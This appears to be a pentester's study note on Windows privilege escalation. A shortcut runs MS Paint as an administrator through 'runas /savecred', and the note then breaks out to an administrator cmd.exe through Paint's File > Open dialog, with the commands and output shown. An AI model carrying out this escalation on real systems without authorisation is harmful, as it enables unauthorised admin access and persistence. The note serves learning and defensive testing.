# Insecure GUI Apps

Some shortcut programs are highly unlikely to appear in cyber penetration sessions. Yet this technique was also used as a persistence technique just to modify the shortcut link.

## 01 - Detect

![[01 - MSPaint Shortcut Properties.png]]

This is what it looks like in the **Target** input field:

```
C:\Windows\System32\runas.exe /user:admin /savecred %windir%\system32\mspaint.exe
```

When we open the `AdminPaint.lnk` shortcut link. We run in the command prompt to find the `mspaint.exe` process.

```
C:\Users\user> tasklist /v | findstr mspaint.exe
mspaint.exe                   3972 RDP-Tcp#0                  2     29,244 K Running         WIN-QBA94KB3IOF\admin                                   0:00:01 Untitled - Paint
```

The process was running as a user called `admin` that is part of the **Administrators** group

## 02 - Exploit

We can exploit this to navigate our reverse shell but let's say we are on a RDP session just to evade detection and we only need to run a few commands using `cmd.exe` with administrator privileges unless it's needed.

While the MSPaint is still running we'll have to navigate to **File > Open** then we enter this in the dialog box:

```
c:/windows/system32/cmd.exe
```

![[02 - Open Command Prompt.png]]

Then click **Open** you've elevated to administrator access.

```
C:\Users\admin\Pictures> whoami
win-qba94kb3iof\admin
```

---
## References

### Internal All The Things

- [Internal All The Things: Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)